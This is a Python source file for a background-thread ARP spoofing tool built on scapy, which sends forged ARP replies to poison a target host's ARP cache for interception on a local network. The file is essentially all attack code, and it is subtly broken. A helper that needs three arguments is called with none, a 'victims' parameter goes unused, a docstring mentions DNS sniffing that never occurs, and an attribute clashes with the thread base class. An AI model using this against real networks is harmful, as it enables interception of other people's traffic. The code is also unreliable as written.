from scapy import packet
from scapy.layers.l2 import ARP
from scapy.sendrecv import sendp, sniff
import time
import threading


class ARPSpoofing(threading.Thread):

    def __init__(self, interface: str, victims: list, target_mac: str, target_ip: str, spoofed_ip: str, delay: int):
        """
        Starts ARP spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param victims: list of the hosts to be spoofed, empty list means all hosts will be spoofed
            :param target_mac: mac of the host that will be spoofed
            :param target_ip: ip of the host that will be spoofed
            :param spoofed_ip: ip address that will be set as source of the spoofed MAC answers that will be sent
            :param delay: delay between outgoing spoofed arp replies
        """
        super(ARPSpoofing, self).__init__()
        self.interface = interface
        self.victims = victims
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.spoofed_ip = spoofed_ip
        self.delay = delay
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def arp_spoof() -> None:

            def create_spoofed_arp_answer(spoofed_ip, target_ip, target_mac) -> packet:
                """
                Creates a spoofed ARP answer packet with source MAC set to host

                    :param spoofed_ip: ip that will be used to poison ARP cache of target,
                        i.e. who attacker claims to be
                    :param target_ip: ip of the host that will be spoofed
                    :param target_mac: mac of the host that will be spoofed
                    :return: Spoofed ARP packet that can be used to poison ARP cache
                """

                spoofed_resp = ARP(
                    op=2,   # 2 = ARP response, 1 = ARP request
                    psrc=spoofed_ip,
                    pdst=target_ip,
                    hwdst=target_mac,
                    # hwsrc Not required since this is set as host mac (attacker mac) by default
                )

                return spoofed_resp

            spoofed_ans = create_spoofed_arp_answer()
            sendp(spoofed_ans, iface=self.interface)

        print("Now ARP spoofing...")
        while True:
            if self.is_stopped():
                print("Stopped ARP spoofing")
                return
            arp_spoof()
            time.sleep(self.delay)

